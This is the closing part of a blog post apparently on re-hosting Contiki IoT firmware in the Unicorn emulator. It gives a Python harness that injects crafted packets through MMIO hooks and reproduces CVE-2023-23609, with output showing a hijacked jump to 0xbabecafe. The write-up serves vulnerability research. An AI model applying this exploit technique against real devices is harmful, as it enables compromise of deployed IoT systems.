    <span class="k">global</span> <span class="n">packet_injected</span><span class="p">,</span> <span class="n">packet_body</span><span class="p">,</span> <span class="n">packet_body_2</span><span class="p">,</span> <span class="n">packet_injected_2</span><span class="p">,</span> <span class="n">packet_body_3</span><span class="p">,</span> <span class="n">packet_injected_3</span><span class="p">,</span> <span class="n">emu_cnt</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_read] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">packet_injected</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body</span><span class="p">)))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body</span><span class="p">[</span><span class="n">packet_injected</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="n">packet_injected</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">elif</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected_2</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body_2</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">packet_injected_2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body_2</span><span class="p">)))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body_2</span><span class="p">[</span><span class="n">packet_injected_2</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="n">packet_injected_2</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">elif</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected_3</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body_3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">packet_injected_3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body_3</span><span class="p">)))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body_3</span><span class="p">[</span><span class="n">packet_injected_3</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="n">packet_injected_3</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">elif</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">&gt;=</span> <span class="mi">4</span> <span class="ow">and</span> <span class="n">emu_cnt</span> <span class="o">&lt;=</span><span class="mi">7</span> <span class="ow">and</span> <span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet_body_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">])</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">packet_body_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">])))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="n">packet_body_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">][</span><span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="n">packet_injected_4_n</span><span class="p">[</span><span class="n">emu_cnt</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>


        <span class="k">else</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">])</span>   <span class="c1"># to bypass sys_ctrl_init, random_init</span>
            <span class="c1"># print(f&#34;content: {mu.mem_read(address, 4)}, ready to write random: {r}&#34;)</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_ARM</span><span class="p">,</span> <span class="n">UC_MODE_THUMB</span><span class="p">)</span>

    <span class="c1"># memory regions</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">REGION_START</span><span class="p">,</span> <span class="n">REGION_SIZE</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="mh">0xe0000000</span><span class="p">,</span> <span class="mh">0x10000000</span><span class="p">)</span> <span class="c1"># NVIC</span>

    <span class="c1"># load ROM</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;hello-world.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>

    <span class="c1"># write memory / patch code</span>
    <span class="c1"># TODO: maybe some patching needed?</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210926</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\xBD</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># patch fade, POP {R4-R6,PC}</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="mh">0x210768</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x70\x47</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># patch wfi</span>
    <span class="c1"># why not push pc, or mov pc,lr</span>

    <span class="c1"># init SP</span>
    <span class="n">init_sp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="n">reset</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ROM_BASE</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_ARM_REG_SP</span><span class="p">,</span> <span class="n">init_sp</span><span class="p">)</span>
    
    <span class="c1"># hooks</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">hook_code</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_BLOCK</span><span class="p">,</span> <span class="n">hook_block</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_UNMAPPED</span><span class="p">,</span> <span class="n">hook_mem_unmapped</span><span class="p">)</span>
    <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_MEM_READ</span><span class="p">,</span> <span class="n">hook_mem_read</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mh">0x40000000</span><span class="p">,</span> <span class="mh">0x60000000</span><span class="p">)</span> <span class="c1"># MMIO read</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;reset:</span><span class="si">{</span><span class="n">reset</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">reset</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="c1"># print(a)</span>


    <span class="c1"># interrupt(mu, 2, )</span>

    <span class="c1"># TODO: run until</span>
    <span class="c1"># 00210768  30bf       wfi</span>

    <span class="c1"># TODO: inject RF data available IRQ</span>
    <span class="c1"># TODO: reach input_l2cap_conn_req</span>
    
    <span class="c1"># TODO: use CVE-2023-23609 to overwrite:</span>
    <span class="c1"># 200010e4  uint32_t notification_process = 0x0</span>
    <span class="n">notification_process</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x200010e8</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;notification_process = </span><span class="si">{</span><span class="n">notification_process</span><span class="si">:</span><span class="s1">08x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x20001268</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">))</span>

    <span class="c1"># TODO: inject irq 160 and crash firmware</span>

<span class="n">main</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>ÂÆûÂú®ÊòØ‰∏ëÈôã‰∏çÂ†™Ôºå‰ΩÜÊòØËÉΩÁî®ÔºÅ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">...
[hook block] 0x203d6c, 2, None
[hook block] 0x203d5a, 4, None
Interrupted...
[hook block] 0x205114, 24, None
[hook block] 0x20512c, 6, None
[hook block] 0x205132, 4, None
[hook block] 0x2052e8, 2, None
[hook block] 0x2052ea, 10, None
0x2052F0: p-&gt;state - 1  0x0
[hook block] 0x2052f6, 10, None
[hook block] 0x2052f4, 2, None
[hook block] 0x205136, 6, None
ok
[hook block] 0x205494, 8, None
0x205498: poll_requested  1
[hook block] 0x2054ac, 4, None
[hook block] 0x2053d8, 14, None
[hook block] 0x2053e8, 2, None
[hook block] 0x2053ea, 6, None
[hook block] 0x2053f0, 16, None
[hook block] 0x205398, 10, None
[hook block] 0x2053a2, 8, None
[hook block] 0x2053aa, 14, None
[hook_mem_unmapped] 21, babecafe, 4, 0, None
0xbabecafe Bingo!!
</code></pre></td></tr></table>
</div>
</div><h2 id="ÁªìÊùü‰∫ÜÂêó">ÁªìÊùü‰∫ÜÂêóÔºü</h2>
<p>Êú¨ÊñáËÆ∞ÂΩï‰∫ÜÂàùÊ¨°‰ΩøÁî® UnicornÔºåÂπ∂Âú®Ê≤°Êúâ‰ªª‰ΩïÁ°¨‰ª∂ÁöÑÊÉÖÂÜµ‰∏ãÂØπÊüêÁâ©ËÅîÁΩë OS Âõ∫‰ª∂ËøõË°åËΩØ‰ª∂Ê®°ÊãüÔºåÂπ∂Â§çÁé∞Êüê‰∏™ËæÉÊòìÂà©Áî®ÁöÑÊºèÊ¥ûÁöÑËøáÁ®ã„ÄÇÁ¨îËÄÖÂØπËá™Â∑±ÂÜôÁöÑÊ®°Êãü‰ª£Á†ÅÁõ∏ÂΩì‰∏çÊª°ÊÑèÔºåÂÖ∂‰∏≠‰πüÊúâ‰∏çÂ∞ëÂú∞ÊñπÂèØ‰ª•Ê∑±Á©∂„ÄÇ‰ΩÜÁõÆÂâçÊâìÁÆóÊöÇÊîæ‰∏Ä‰∏ãÔºåÂ∏åÊúõÂá†‰∏™ÊúàÂêéÂõûÈ°æËøôÁØáÊñáÁ´†Êó∂‰ºöËßâÂæóÊºèÊ¥ûÁôæÂá∫Ôºå‰æùÊâòÁ≠îËæ©„ÄÇÊî∂Â∑•ÔºÅ</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-09-27</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2023/09/re-host/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting Â∞èËÆ∞"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://xidoo.top/2023/09/re-host/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting Â∞èËÆ∞" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting Â∞èËÆ∞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on ÂæÆÂçö" data-sharer="weibo" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting Â∞èËÆ∞"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting Â∞èËÆ∞" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting Â∞èËÆ∞" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://xidoo.top/2023/09/re-host/" data-title="Contiki Re-hosting Â∞èËÆ∞"><i class="fab fa-evernote fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2023/05/rev_main/" class="prev" rel="prev" title="ÈÄÜÂêëÊñπÊ≥ïËÆ∫"><i class="fas fa-angle-left fa-fw"></i>ÈÄÜÂêëÊñπÊ≥ïËÆ∫</a></div>
</div>
<div id="comments"></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">üè¥‚Äç‚ò†Ô∏è Love it, Make magic</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">x1do0</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":15},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
